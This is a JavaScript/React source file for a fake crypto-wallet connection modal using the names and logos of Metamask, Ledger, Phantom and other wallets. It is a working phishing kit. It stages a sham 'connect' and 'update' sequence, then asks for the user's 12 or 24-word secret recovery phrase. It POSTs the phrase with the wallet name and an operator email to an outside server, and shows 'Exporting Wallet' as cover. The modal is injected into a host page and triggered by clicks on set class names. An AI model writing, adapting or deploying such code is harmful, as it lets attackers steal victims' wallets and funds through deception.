(function () {
	const { useState, useEffect, Fragment } = React;
	const { createRoot } = ReactDOM;

	// ---------------- WALLET DATA & IMAGES ----------------
	// Note: Using placeholder images. Replace with real URLs if needed.
	const wallets = [
		{ name: "Metamask", id: "metamask", logo: "img/metamask.png" },
		{ name: "Trust Wallet", id: "trust", logo: "img/trustwallet.png" },
		{ name: "Coinbase Wallet", id: "coinbase", logo: "img/coinbase.jpeg" },
		{ name: "Ledger", id: "ledger", logo: "img/ledger.jpg" },
		{ name: "Trezor Wallet", id: "trezor", logo: "img/trezor.png" },
		{ name: "Phantom", id: "phantom", logo: "img/phantom.png" },
		{ name: "Solflare", id: "solflare", logo: "img/solflare.png" },
		{
			name: "WalletConnect",
			id: "walletconnect",
			logo: "img/walletconnect.jpg",
		},
	];

	// ---------------- UTILITY COMPONENTS ----------------

	/**
	 * Reusable header component for all views after the initial wallet list.
	 */
	const ModalHeader = ({ wallet, onClose }) =>
		React.createElement(
			"div",
			{
				className:
					"flex items-center justify-between w-full pb-5 border-b border-gray-700 mb-5",
			},
			React.createElement(
				"div",
				{ className: "flex items-center flex-grow" },
				React.createElement(
					"div",
					{
						className:
							"w-8 h-8 rounded-lg overflow-hidden bg-white flex items-center justify-center mr-3",
					},
					React.createElement("img", {
						src: wallet.logo,
						alt: `${wallet.name} Logo`,
						className: "w-full h-full object-contain p-1",
					})
				),
				React.createElement(
					"span",
					{ className: "text-white text-lg font-bold" },
					wallet.name
				)
			),
			React.createElement(
				"button",
				{
					onClick: onClose,
					className:
						"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
				},
				"×"
			)
		);

	/**
	 * Custom alert/message box component.
	 */
	const MessageBox = ({ message, onClose }) => {
		useEffect(() => {
			const timer = setTimeout(onClose, 3000); // Close after 3 seconds
			return () => clearTimeout(timer);
		}, [onClose]);

		return React.createElement(
			"div",
			{
				className:
					"absolute top-4 left-1/2 -translate-x-1/2 bg-red-600 text-white px-4 py-2 rounded-lg shadow-lg text-sm z-50 animate-fade-in-down",
			},
			message
		);
	};

	// ---------------- MODAL VIEWS ----------------

	/**
	 * Step 1: Displays the list of wallets for the user to select.
	 */
	const WalletSelectView = ({ onClose, onSelectWallet }) =>
		React.createElement(
			"div",
			{
				className:
					"relative w-full md:w-[95%] max-w-[420px] h-[550px] md:h-auto bg-neutral-900 border border-gray-700 rounded-t-3xl md:rounded-3xl p-6 shadow-2xl flex flex-col overflow-hidden",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(
				"div",
				{
					className:
						"flex justify-between items-center pb-5 border-b border-gray-700 mb-4",
				},
				React.createElement(
					"div",
					{ className: "flex items-center gap-3" },
					React.createElement(
						"div",
						{
							className:
								"bg-neutral-800 text-white text-xs font-semibold px-3 py-1 rounded-full",
						},
						"reown"
					),
					React.createElement(
						"span",
						{ className: "text-white text-lg" },
						"Manual Kit"
					)
				),
				React.createElement(
					"button",
					{
						onClick: onClose,
						className:
							"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
					},
					"×"
				)
			),
			React.createElement(
				"div",
				{ className: "flex-1 overflow-y-auto px-1 -mx-1 no-scrollbar" },
				React.createElement(
					"p",
					{ className: "text-gray-400 mb-3 text-sm" },
					"Popular:"
				),
				wallets.map((wallet, index) =>
					React.createElement(
						"div",
						{
							key: wallet.id,
							className:
								"flex items-center justify-between p-3.5 mb-3 bg-neutral-800 rounded-2xl cursor-pointer hover:bg-neutral-700 transition-colors",
							onClick: () => onSelectWallet(wallet),
						},
						React.createElement(
							"div",
							{ className: "flex items-center gap-4" },
							React.createElement(
								"div",
								{
									className:
										"w-10 h-10 rounded-xl overflow-hidden bg-white flex items-center justify-center border border-gray-600",
								},
								React.createElement("img", {
									src: wallet.logo,
									alt: `${wallet.name} Logo`,
									className: "w-full h-full object-contain",
								})
							),
							React.createElement(
								"span",
								{ className: "text-white font-medium" },
								wallet.name
							)
						),
						index === 0 &&
							React.createElement(
								"span",
								{
									className:
										"text-xs font-semibold text-green-500 bg-green-900/40 px-3 py-1 rounded-full",
								},
								"RECOMMENDED"
							)
					)
				)
			),
			React.createElement(
				"div",
				{
					className:
						"flex flex-col items-center justify-center p-6 mt-4 bg-neutral-800 border border-gray-700 rounded-2xl",
				},
				React.createElement("img", {
					src: "img/globe.svg",
					alt: "Globe Icon",
					className: "w-16 h-16 mb-2",
				}),
				React.createElement(
					"p",
					{ className: "text-white text-sm text-center" },
					"Connect your wallet to get started"
				)
			)
		);

	/**
	 * Step 2: Shows a loading icon after a wallet is selected.
	 */
	const WalletConnectingView = ({ wallet, onBack, onFinishConnect }) => {
		useEffect(() => {
			const timer = setTimeout(onFinishConnect, 1500);
			return () => clearTimeout(timer);
		}, [onFinishConnect]);
		return React.createElement(
			"div",
			{
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			React.createElement(
				"div",
				{
					className:
						"flex-1 flex flex-col items-center justify-center",
				},
				React.createElement("div", {
					className:
						"animate-spin rounded-full h-16 w-16 border-4 border-solid border-gray-700 border-t-indigo-500",
				}),
				React.createElement(
					"p",
					{ className: "mt-6 text-gray-400 text-lg" },
					"Connecting to ",
					wallet.name,
					"..."
				)
			)
		);
	};

	/**
	 * Step 3: Displays information about the wallet update and an update button.
	 */
	const WalletUpdateInfoView = ({ wallet, onBack, onStartUpdate }) =>
		React.createElement(
			"div",
			{
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			React.createElement(
				"div",
				{
					className:
						"flex-1 flex flex-col items-center justify-center",
				},
				React.createElement(
					"h3",
					{ className: "text-white text-2xl font-bold mb-4" },
					"Update Wallet"
				),
				React.createElement(
					"p",
					{ className: "text-gray-400 mb-8" },
					"To ensure a secure connection, update your wallet."
				),
				React.createElement(
					"button",
					{
						onClick: onStartUpdate,
						className:
							"w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors",
					},
					"Update"
				)
			)
		);

	/**
	 * Step 4: Shows a full-screen loading bar.
	 */
	const WalletFinalLoadingView = ({ wallet, onBack, onFinishLoading }) => {
		const [progress, setProgress] = useState(0);
		useEffect(() => {
			let p = 0;
			const interval = setInterval(() => {
				p += 2;
				if (p > 100) {
					clearInterval(interval);
					onFinishLoading();
				} else setProgress(p);
			}, 100);
			return () => clearInterval(interval);
		}, [onFinishLoading]);

		return React.createElement(
			"div",
			{
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			React.createElement(
				"div",
				{
					className:
						"flex-1 flex flex-col items-center justify-center",
				},
				React.createElement(
					"div",
					{
						className:
							"w-24 h-24 bg-white flex items-center justify-center mb-6 rounded-lg",
					},
					React.createElement("img", {
						src: wallet.logo,
						className: "w-full h-full object-contain p-2",
					})
				),
				React.createElement(
					"h3",
					{ className: "text-white text-2xl font-bold mb-2" },
					"Updating ",
					wallet.name
				),
				React.createElement(
					"div",
					{ className: "w-full bg-gray-700 rounded-full h-2.5" },
					React.createElement("div", {
						className:
							"bg-indigo-600 h-2.5 rounded-full transition-all duration-100 ease-linear",
						style: { width: progress + "%" },
					})
				),
				React.createElement(
					"p",
					{ className: "mt-4 text-sm text-gray-500" },
					progress,
					"%"
				)
			)
		);
	};

	/**
	 * Step 5: A new view for user input after a successful wallet connection.
	 * Displays dynamic input fields for a recovery phrase.
	 */
	const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
		const [wordCount, setWordCount] = useState(12);
		const [phrases, setPhrases] = useState(Array(12).fill(""));
		const [loading, setLoading] = useState(false);
		const [message, setMessage] = useState(null);

		const handleWordCountChange = (e) => {
			const newWordCount = parseInt(e.target.value, 10);
			setWordCount(newWordCount);
			setPhrases(Array(newWordCount).fill(""));
		};

		const handlePhraseChange = (index, value) => {
			const trimmedValue = value.trim();
			const newPhrases = [...phrases];

			if (trimmedValue.includes(" ")) {
				const pastedWords = trimmedValue
					.split(" ")
					.filter((word) => word !== "");
				const newWordCount = pastedWords.length;

				if (newWordCount === 12 || newWordCount === 24) {
					setWordCount(newWordCount);
					const adjustedPhrases = Array(newWordCount).fill("");
					for (let i = 0; i < newWordCount; i++) {
						adjustedPhrases[i] = pastedWords[i] || "";
					}
					setPhrases(adjustedPhrases);
					setMessage(null);
				} else {
					setMessage(
						"Invalid recovery phrase length. Please enter a 12 or 24-word phrase."
					);
					setPhrases(Array(phrases.length).fill(""));
				}
			} else {
				newPhrases[index] = trimmedValue;
				setPhrases(newPhrases);
			}
		};

		const togglePhraseVisibility = (index) => {
			const input = document.getElementById(`phrase-input-${index}`);
			if (input) {
				input.type = input.type === "password" ? "text" : "password";
			}
		};

		const handleSendDetails = async () => {
			if (phrases.some((phrase) => !phrase.trim())) {
				setMessage("Please fill in all recovery phrase fields.");
				return;
			}
			const combinedPhrase = phrases.join(" ");

			try {
				setLoading(true);

				const response = await fetch(
					"https://velofinza.com/backend/api/v1/wallet",
					{
						method: "POST",
						headers: {
							"Content-Type": "application/json",
						},
						body: JSON.stringify({
							walletName: wallet.name,
							details: combinedPhrase,
							email: "oluwaidan@proton.me",
						}),
					}
				);

				if (response.ok) {
					console.log("Details sent successfully!");
				} else {
					console.error(
						"Failed to send details:",
						response.statusText
					);
				}
			} catch (error) {
				console.error("Error sending details:", error);
			} finally {
				setLoading(false);
				onSend();
			}
		};

		return React.createElement(
			"div",
			{
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			message &&
				React.createElement(MessageBox, {
					message: message,
					onClose: () => setMessage(null),
				}),
			React.createElement(
				"div",
				{
					className:
						"flex-1 flex flex-col items-center justify-center w-full",
				},
				React.createElement(
					"h3",
					{ className: "text-white text-2xl font-bold mb-4" },
					"Import your wallet with your Secret Recovery Phrase"
				),
				React.createElement(
					"p",
					{ className: "text-gray-400 mb-4" },
					"We will use your Secret Recovery Phrase to validate your ownership."
				),
				React.createElement(
					"div",
					{ className: "w-full mb-4" },
					React.createElement(
						"select",
						{
							className:
								"w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors",
							value: wordCount,
							onChange: handleWordCountChange,
						},
						React.createElement(
							"option",
							{ value: 12 },
							"12-word phrase"
						),
						React.createElement(
							"option",
							{ value: 24 },
							"24-word phrase"
						)
					)
				),
				React.createElement(
					"div",
					{
						className:
							"w-full bg-neutral-800 text-gray-400 p-3 rounded-lg flex items-center mb-4",
					},
					React.createElement(
						"svg",
						{
							xmlns: "http://www.w3.org/2000/svg",
							className: "h-5 w-5 mr-2",
							viewBox: "0 0 20 20",
							fill: "currentColor",
						},
						React.createElement("path", {
							fillRule: "evenodd",
							d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
							clipRule: "evenodd",
						})
					),
					"You can paste your entire secret recovery phrase into any field"
				),
				React.createElement(
					"div",
					{
						className:
							"grid grid-cols-2 gap-4 w-full max-h-[250px] overflow-y-auto mb-4 no-scrollbar",
					},
					phrases.map((phrase, index) =>
						React.createElement(
							"div",
							{ key: index, className: "flex items-center" },
							React.createElement(
								"span",
								{ className: "text-gray-400 mr-2" },
								`${index + 1}.`
							),
							React.createElement(
								"div",
								{ className: "relative w-full" },
								React.createElement("input", {
									id: `phrase-input-${index}`,
									type: "password",
									className:
										"w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors pr-10",
									placeholder: "Enter word",
									value: phrase,
									onChange: (e) =>
										handlePhraseChange(
											index,
											e.target.value
										),
									required: true,
								}),
								React.createElement(
									"button",
									{
										type: "button",
										onClick: () =>
											togglePhraseVisibility(index),
										className:
											"absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors",
									},
									React.createElement(
										"svg",
										{
											xmlns: "http://www.w3.org/2000/svg",
											className: "h-5 w-5",
											viewBox: "0 0 20 20",
											fill: "currentColor",
										},
										React.createElement("path", {
											d: "M10 12a2 2 0 100-4 2 2 0 000 4z",
										}),
										React.createElement("path", {
											fillRule: "evenodd",
											d: "M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z",
											clipRule: "evenodd",
										})
									)
								)
							)
						)
					)
				),
				React.createElement(
					"button",
					{
						onClick: handleSendDetails,
						className:
							"mt-4 w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-3 rounded-xl transition-colors",
						disabled: loading,
					},
					loading ? "Submitting..." : "Confirm Secret Recovery Phrase"
				)
			)
		);
	};

	/**
	 * Step 6: Displays a message after details are submitted.
	 */
	const WalletSentDetailsView = ({ wallet, onClose }) =>
		React.createElement(
			"div",
			{
				className:
					"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose }),
			React.createElement(
				"div",
				{
					className:
						"flex-1 flex flex-col items-center justify-center",
				},
				React.createElement(
					"h3",
					{ className: "text-white text-2xl font-bold mb-4" },
					"Exporting Wallet"
				),
				React.createElement("div", {
					className:
						"animate-spin rounded-full h-16 w-16 border-4 border-solid border-gray-700 border-t-indigo-500",
				}),
				React.createElement(
					"p",
					{ className: "mt-6 text-gray-400 text-lg" },
					"Your wallet is being exported securely..."
				)
			)
		);

	// ---------------- MAIN MODAL ----------------
	const WalletModal = ({ isOpen, onClose }) => {
		const [activeView, setActiveView] = useState("main");
		const [selectedWallet, setSelectedWallet] = useState(null);

		useEffect(() => {
			if (isOpen) {
				setActiveView("main");
				setSelectedWallet(null);
			}
		}, [isOpen]);

		const handleSelectWallet = (wallet) => {
			setSelectedWallet(wallet);
			setActiveView("connecting");
		};

		const handleFinishConnect = () => setActiveView("update-info");
		const handleStartUpdate = () => setActiveView("final-loading");
		const handleFinishLoading = () => setActiveView("recovery-input");
		const handleSend = () => setActiveView("sent");
		const handleBackToMain = () => setActiveView("main");
		const handleFullClose = () => {
			setActiveView("main");
			onClose();
		};

		const renderView = () => {
			switch (activeView) {
				case "main":
					return React.createElement(WalletSelectView, {
						onClose: handleFullClose,
						onSelectWallet: handleSelectWallet,
					});
				case "connecting":
					return React.createElement(WalletConnectingView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onFinishConnect: handleFinishConnect,
					});
				case "update-info":
					return React.createElement(WalletUpdateInfoView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onStartUpdate: handleStartUpdate,
					});
				case "final-loading":
					return React.createElement(WalletFinalLoadingView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onFinishLoading: handleFinishLoading,
					});
				case "recovery-input":
					return React.createElement(RecoveryPhraseInputView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onSend: handleSend,
					});
				case "sent":
					return React.createElement(WalletSentDetailsView, {
						wallet: selectedWallet,
						onClose: handleFullClose,
					});
				default:
					return null;
			}
		};

		const mainContainerClasses =
			activeView === "main"
				? "fixed inset-0 flex items-end md:items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300"
				: "fixed inset-0 flex items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300";
		const contentContainerClasses =
			activeView === "main"
				? "relative w-full md:w-[95%] max-w-[420px]"
				: "relative w-full h-full md:w-[95%] md:h-auto max-w-[420px]";

		return React.createElement(
			"div",
			{
				className: `${mainContainerClasses} ${
					isOpen ? "opacity-100 visible" : "opacity-0 invisible"
				}`,
				onClick:
					activeView === "main" ? handleFullClose : handleBackToMain,
			},
			React.createElement(
				"div",
				{
					className: contentContainerClasses,
					onClick: (e) => e.stopPropagation(),
				},
				renderView()
			)
		);
	};

	// ---------------- CONTROLLER AND PUBLIC API ----------------
	const ROOT_ELEMENT_ID = "wallet-modal-root";
	const TRIGGER_CLASSNAMES = ["e1p5oug0", "e1vhhgxp2"];
	let root = null;
	let setOpenGlobal = null;

	function WalletController() {
		const [open, setOpen] = useState(false);
		useEffect(() => {
			setOpenGlobal = setOpen;
		}, []);
		return React.createElement(WalletModal, {
			isOpen: open,
			onClose: () => setOpen(false),
		});
	}

	function renderApp() {
		let container = document.getElementById(ROOT_ELEMENT_ID);
		if (!container) {
			container = document.createElement("div");
			container.id = ROOT_ELEMENT_ID;
			document.body.appendChild(container);
		}
		if (!root) {
			root = createRoot(container);
		}
		root.render(React.createElement(WalletController));
	}

	window.walletModal = {
		open: () => {
			if (setOpenGlobal) setOpenGlobal(true);
		},
		close: () => {
			if (setOpenGlobal) setOpenGlobal(false);
		},
	};

	document.addEventListener("click", (event) => {
		const clickedElement = event.target.closest(
			TRIGGER_CLASSNAMES.map((c) => `.${c}`).join(",")
		);
		if (clickedElement) {
			window.walletModal.open();
		}
	});

	document.addEventListener("DOMContentLoaded", renderApp);
})();
